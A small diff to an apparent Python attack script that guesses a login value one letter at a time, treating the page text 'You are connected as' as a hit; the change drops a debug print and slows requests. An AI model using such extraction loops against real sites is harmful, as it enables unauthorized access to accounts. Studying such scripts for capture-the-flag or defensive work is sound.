@@ -21,9 +21,8 @@ print('[+] Format url: '+args.url+"?"+pa1+"&"+pa2+args.m)
 def findl(rec=True,f=""):
   for i in alphabet:
     nu = args.url+"?"+pa1+f+i+"&"+pa2+args.m
-    print(nu)
     rep = req.get(nu)
-    time.sleep(0.03)
+    time.sleep(0.07)
     if 'You are connected as' in rep.text:
       if rec==True:
         print(f'\n[+] New letter found : {f+i}')
